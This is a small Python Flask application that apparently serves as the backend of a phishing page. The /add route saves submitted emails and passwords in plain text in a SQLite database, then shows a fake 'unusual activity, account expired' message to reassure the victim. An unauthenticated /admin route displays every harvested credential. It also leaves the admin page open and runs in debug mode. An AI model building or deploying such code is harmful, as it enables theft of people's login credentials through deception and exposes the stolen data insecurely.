from flask import Flask, request, redirect, render_template
from sqlalchemy import Table, create_engine, Column, Integer, String
from sqlalchemy.orm import declarative_base, Session, sessionmaker

app = Flask(__name__)
engine = create_engine("sqlite:///mydb.db", echo=True)
base = declarative_base()

class Accounts(base):
    __tablename__ = 'accounts'
    id = Column(Integer, primary_key=True)
    email = Column(String, nullable=False)
    password = Column(String, nullable=False)


base.metadata.create_all(engine)
Session = sessionmaker(bind=engine)
session = Session()

@app.route("/")
def home():
    return render_template("app.html")

@app.route("/add", methods=["POST", "GET"])
def add():
    email = request.form.get("email")
    password = request.form.get("password")
    newAcc = Accounts(email=email, password=password)
    session.add(newAcc)
    session.commit()
    return "We detected unusual thing on your account. You are expired for: 7days!"

@app.route("/admin", methods=["POST", "GET"])
def admin():
    select = session.query(Accounts).all()
    return render_template("admin.html", select=select)

if __name__ == '__main__':
    app.run(debug=True)